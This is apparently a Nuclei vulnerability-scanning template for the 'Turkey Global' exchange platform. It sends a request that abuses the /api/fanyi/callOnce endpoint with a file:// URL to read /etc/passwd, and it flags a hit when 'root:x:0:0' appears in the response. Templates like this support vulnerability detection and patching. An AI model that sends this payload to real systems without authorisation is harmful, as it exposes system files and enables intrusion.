id: turkey-global-exchange-lfi

info:
  name: "Turkey Global前台任意文件读取漏洞"
  author: 0dayPoc
  severity: medium
  description: |-
    Turkey Global作为多语言全开源的交易所系统，包含币币交易/合约交易/秒合约交易/C2C交易/新币认购/理财等模块，其后端采用FastAdmin框架实现。该系统在前台组件中存在文件访问控制缺陷，攻击者可构造特定请求获取非授权文件内容。
  tags: Turkey Global

http:
- raw:
  - |
    GET /api/fanyi/callOnce?url=file:///etc/passwd HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'root:x:0:0'
